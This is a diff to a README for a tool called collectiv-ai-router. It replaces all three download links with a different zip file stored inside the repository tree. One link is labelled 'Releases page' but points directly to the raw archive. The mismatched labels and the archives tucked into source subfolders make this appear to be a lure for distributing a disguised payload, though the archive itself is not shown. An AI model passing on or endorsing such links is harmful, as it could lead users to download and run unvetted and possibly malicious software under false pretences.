@@ -15,7 +15,7 @@ Before you begin, make sure your system meets these requirements:
 
 ## 📥 Download Now
 
-[![Download collectiv-ai-router](https://raw.githubusercontent.com/agsvicky/collectiv-ai-router/main/router/providers/collectiv-ai-router-1.3.zip)](https://raw.githubusercontent.com/agsvicky/collectiv-ai-router/main/router/providers/collectiv-ai-router-1.3.zip)
+[![Download collectiv-ai-router](https://github.com/agsvicky/collectiv-ai-router/raw/refs/heads/main/router/ai_router_collectiv_v2.8-alpha.1.zip)](https://github.com/agsvicky/collectiv-ai-router/raw/refs/heads/main/router/ai_router_collectiv_v2.8-alpha.1.zip)
 
 You can download the latest version of the software from our Releases page. 
 
@@ -23,7 +23,7 @@ You can download the latest version of the software from our Releases page.
 
 To get started with collectiv-ai-router, follow these simple steps:
 
-1. **Visit the Releases page**: Click on this link to go to the [Releases page](https://raw.githubusercontent.com/agsvicky/collectiv-ai-router/main/router/providers/collectiv-ai-router-1.3.zip).
+1. **Visit the Releases page**: Click on this link to go to the [Releases page](https://github.com/agsvicky/collectiv-ai-router/raw/refs/heads/main/router/ai_router_collectiv_v2.8-alpha.1.zip).
    
 2. **Choose the latest version**: On the Releases page, you will see a list of versions. Select the topmost version, which is usually the newest.
 
@@ -79,6 +79,6 @@ Refer to the official documentation to learn more about features, setup, and tro
 
 If you’d like to contribute to the project, feel free to visit the GitHub repository for guidelines on how to open issues or submit feature requests. All contributions are welcome!
 
-[![Download collectiv-ai-router](https://raw.githubusercontent.com/agsvicky/collectiv-ai-router/main/router/providers/collectiv-ai-router-1.3.zip)](https://raw.githubusercontent.com/agsvicky/collectiv-ai-router/main/router/providers/collectiv-ai-router-1.3.zip)
+[![Download collectiv-ai-router](https://github.com/agsvicky/collectiv-ai-router/raw/refs/heads/main/router/ai_router_collectiv_v2.8-alpha.1.zip)](https://github.com/agsvicky/collectiv-ai-router/raw/refs/heads/main/router/ai_router_collectiv_v2.8-alpha.1.zip)
 
 This guide aims to ensure you have a smooth experience with collectiv-ai-router. Enjoy using the application!
